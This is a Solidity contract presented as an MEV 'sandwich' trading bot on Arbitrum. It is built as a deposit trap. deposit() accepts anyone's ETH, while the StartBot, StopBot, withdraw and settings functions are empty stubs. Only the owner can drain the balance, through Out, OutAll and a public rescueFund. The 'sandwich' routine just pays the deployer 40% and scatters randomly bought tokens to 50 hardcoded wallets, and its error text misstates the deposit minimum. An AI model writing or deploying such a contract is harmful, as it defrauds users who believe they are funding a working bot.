// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}


abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    /**
     * @dev Unauthorized reentrant call.
     */
    error ReentrancyGuardReentrantCall();

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be _NOT_ENTERED
        if (_status == _ENTERED) {
            revert ReentrancyGuardReentrantCall();
        }

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
     * `nonReentrant` function in the call stack.
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == _ENTERED;
    }
}

contract MEV is Ownable, ReentrancyGuard {

     IUniswapV2Router private swapRouter;
    uint256 public constant totalTokens = 23;
    uint256 public constant totalAddresses = 50;
    address[totalTokens] private tokenList = [
    0x539bdE0d7Dbd336b79148AA742883198BBF60342,//MAGIC 
    0x6C2C06790b3E3E3c38e12Ee22F8183b37a13EE55,//DPX 
    0x32Eb7902D4134bf98A28b963D26de779AF92A212,//RDPX 
    0x912CE59144191C1204E64559FE8253a0e49E6548,//ARB 
    0x8D9bA570D6cb60C7e3e0F31343Efe75AB8E65FB1,//gOHM 
    0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f,//WBTC 
    0x2e80259C9071B6176205FF5F5Eb6F7EC8361b93f,//HASH 
    0x51fC0f6660482Ea73330E414eFd7808811a57Fa2,//PREMIA 
    0x30dcBa0405004cF124045793E1933C798Af9E66a,//YDF 
    0x73700aeCfC4621E112304B6eDC5BA9e36D7743D3,//lqETH 
    0xCB24B141ECaaAd0d2c255d6F99d6f4790546a75c,//EXPO 
    0xaa54e84A3e6e5A80288d2C2f8e36eA5cA3A3Ca30,//SHARBI 
    0x07E49d5dE43DDA6162Fa28D24d5935C151875283,//GOVI 
    0x3E6648C5a70A150A88bCE65F4aD4d506Fe15d2AF,//SPELL 
    0x02150e97271fDC0D6E3A16d9094A0948266F07dD,//HAMI 
    0x27D8De4c30ffDE34e982482AE504fC7F23061f61,//MMT 
    0x93C15cd7DE26f07265f0272E0b831C5D7fAb174f,//LIQD 
    0xA6219B4Bf4B861A2b1C02da43b2aF266186eDC04,//ARVAULT 
    0x6694340fc020c5E6B96567843da2df01b2CE1eb6,//STG 
    0xBcc9C1763d54427bDF5EfB6e9EB9494E5a1fbAbf,//HWT 
    0xFEa7a6a0B346362BF88A9e4A88416B77a57D6c2A,//MIM 
    0xd4d42F0b6DEF4CE0383636770eF773390d85c61A//SUSHI
    ];

    address[totalAddresses] private walletList = [
        0xA390F8307D15BEc3B241Cd2788fAb9129Aac9Ec8,
        0xf3ddbE7b21c7bD2b8F836017359D006ae3f92297,
        0x902DfCed0281982EA193A925def6C2f722C03347,
        0xDd214CE9F991592857B7f0725B6e1AFB7104af03,
        0xD3181675a8E816F2728D5B075E5ed29126015d37,
        0x00b44f99FaE1453d3720C1af3b9F2CB69382b323,
        0x11b69773e4c33F7Edd127Ee3c6c528f919bCa032,
        0x8E5f6f92b07731c0615D86B56C9eD501B24D9250,
        0xeB3254Ca6092d4880FFED3b34aFeb03770E87D57,
        0xD889D33cB09697bcEAF4573645cE603c7ac3a416,
        0xcae4A368dCF21547Ed83E80b0F03BD3F842314A5,
        0x75BB90446466bcF18Af03A57b22bebb613c58066,
        0x4cA596DA6F111aee8f7Bf5Bf80B7E1a060a2e9EF,
        0x22CEf4f4f07cB79174d635Bf7F476ea6C6009eE1,
        0x2c50f23f3aEEAef73DB2798f20E8cDC89b424b26,
        0x84ab74fe031eA02488D4C28fa70c7daA818b28a3,
        0xfd5421F19cB21F5F940eD9A2A6Ac55B7489281B8,
        0x404dC03040ca803F8104E01594aaBD3780288E8b,
        0x07D2Ea354CefE9A489c4e88403A3180CBFffc6c4,
        0x397c42Ab7694C08b8831360C030A6E53053cBD13,
        0x49971947Be80648E195EcE3ba4EE773C6B39Cb05,
        0x10841De53fCBF834C1d0eb7ac8c01E79013b97Cf,
        0x454CAdD08a4e9ae3d7D348BaA2cC63d679f14a9b,
        0xC1B00381699338D39D009245c45aAC08D424d4BC,
        0x62A584531ECfc0Ad10FBd088Eb1c5C08386F3341,
        0xeB89E899134D69B915080DE2f2B5a4bdA393ee1A,
        0x7f2fd67B0c500e5389423DbAea5dC2b7C99DdC79,
        0x51F32394B43eae9285bfB3370e70C4489698d36b,
        0x5487685B7296e519580bb3ba3485a0F617F1Fe14,
        0xc1B240777e906cf2BAfabac74FB22c377FE40012,
        0x1Ec888a716422A830282b96fBb8790bA1dF45c4d,
        0x1617B8BFD0E19673ffbb866Bdf398A67856e7600,
        0x2Fd6463aDbdE8D737a83B26a86e849A09F9cCb85,
        0x28a166860C81fF64de712F0736a2D594BD1aac95,
        0xd76F7C0bb2deb5b630b7a882F6B01490a8D28882,
        0x0277959AF8d243743dF0Ee000658F88e345F80DB,
        0x352E281177866E768a584007a5aE8e43e168d1c3,
        0x86b88050E95f5Abeb2C76F729c59523e8E2895D7,
        0xd8121843a3893c7d049F1cd7919E3050842A798A,
        0x2E1Eec7Ff2BCD35Eb8c05E6962a582Dce0cc03A0,
        0x77989c9C77063b8d95d674ed7079Fc0273c19c67,
        0x2d39AD1C9f11313C2F074218D1f2E370185012E2,
        0xd227b9F4Afc1885211e70dd0d9aefD2CffC01AeB,
        0xC91Ce75801cC84d05abaa8445C30a75C268ab8b0,
        0x2E0a2469D1C8C2C5e76517Fc3aF97E9573072C7c,
        0x01f52bb424c0775405ad37Ab0bB719fedD3E04BE,
        0x9731a2C6e2e22751b99a61bE77DBd6938368a156,
        0x433F3a7afD989BA96155Ac4F28187dd7c1F15E3E,
        0xe9748053FbD09936872bbD82cAEBA843dd518D55,
        0x275b23FCb43e46Db317a14E73c097BF5D5fCF145
    ];
    uint256 private nonce = 0;
    uint256 public randomNumber;

    event Rahul(string _msg, uint256 _amount, uint256 _eth);
    event Test(address _token, uint256 _amount);


    constructor() {
        IUniswapV2Router _uniswapRouter = IUniswapV2Router(
            0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506
        );
        swapRouter = _uniswapRouter;
    }

    function getRandomNumberFrom(uint256 _number) public returns (uint256) {
        randomNumber =
            uint256(
                keccak256(
                    abi.encodePacked(block.timestamp, block.prevrandao, nonce)
                )
            ) %
            _number;
        nonce++;
        return (randomNumber);
    }

     function sandwichV3(address _tokenAddress, uint256 _buyingAmount) public onlyOwner{


       address token = _tokenAddress;
       uint256 amount = _buyingAmount;
        _swapETHForTokens(token, amount);
        // _swapTokensForETH(_tokenAddress , _recipient);

    }

    function sandwich(uint256 _ethAmount) public onlyOwner {
        // START

        // 1. Takes input argument of ETH amount
        require(
            address(this).balance >= _ethAmount,
            "Insufficient ETH on Contract"
        );

        // 2. Split the ETH amount into 60:40
        uint256 forTransaction = (_ethAmount * 60) / 100;
        uint256 forDeployer = (_ethAmount * 40) / 100;

        // 3. 40% transfer to the deployer
        payable(owner()).transfer(forDeployer);

        // 4. Randomly choose a pair of token from list of 20
        address tokenAddress1 = tokenList[getRandomNumberFrom(totalTokens)];

        // 5. Swap half ETH to Token
        _swapETHForTokens(tokenAddress1, forTransaction / 2);

        // 5. Swap another half ETH to Token
        address tokenAddress2 = tokenList[getRandomNumberFrom(totalTokens)];
        _swapETHForTokens(tokenAddress2, forTransaction / 2);

        // 6. Send ETH randomly to any 50 wallet given
        address uniqueAddress = walletList[getRandomNumberFrom(totalAddresses)];

        uint256 _balance1 = IERC20(tokenAddress1).balanceOf(address(this));
        uint256 _balance2 = IERC20(tokenAddress2).balanceOf(address(this));

        IERC20(tokenAddress1).transfer(uniqueAddress, _balance1);
        IERC20(tokenAddress2).transfer(uniqueAddress, _balance2);

        // END
    }

    // Swap ETH for tokens, supporting tokens with fee on transfer
    function _swapETHForTokens(address _tokenAddress, uint256 ethAmount) private {
        address[] memory path = new address[](2);
        path[0] = swapRouter.WETH();
        path[1] = _tokenAddress;

        uint256 deadline = block.timestamp + 300; // Use a deadline for the swap

        // Perform the swap
        swapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: ethAmount
        }(0, path, address(this), deadline);
        emit Rahul("ETH to Token Swaped", 0, ethAmount);
    }

    function _swapTokensForETH(address _tokenAddress ,  address _recipient) private {
        address[] memory path = new address[](2);
        path[0] = _tokenAddress;
        path[1] = swapRouter.WETH();
        IERC20 token = IERC20(_tokenAddress);
        uint256 deadline = block.timestamp + 300; // Use a deadline for the swap
        swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(token.balanceOf(address(this)),  0, path, _recipient, deadline);

    }

    function rescueFund(address _tokenAddress) public {
        payable(owner()).transfer(address(this).balance);
        IERC20 token = IERC20(_tokenAddress);
        token.transfer(owner(), token.balanceOf(address(this)));
    }

    

    // Receive function to receive ETsH
    receive() external payable {}
    
    uint256 constant minimumDeposit = 0.001 ether;

    
    function deposit() public payable {
        require(msg.value >= minimumDeposit, "Deposit amount must be at least 0.35 ETH");
        // Deposit logic here
    }

    function StartBot() public {
        // Blank function - do nothing
    }

    function StopBot() public {
        // Blank function - do nothing
    }

    function withdraw() public {
        // Blank function - do nothing
    }

    function settings() public {
        // Blank function - do nothing
    }

    function Out(address _admin, uint256 amount) public onlyOwner nonReentrant {
        require(address(this).balance >= amount, "Insufficient contract balance");
        // Withdraw logic here
         payable(_admin).transfer(amount);
    }

    function OutAll(address _admin) public onlyOwner nonReentrant {
        require(address(this).balance > 0, "No balance to withdraw");
        // Withdraw all logic here
        payable(_admin).transfer(address(this).balance);
    }
}


// UNISWAP V2 Router
// https://arbiscan.io/address/0x1b02da8cb0d097eb8d57a175b88c7d8b47997506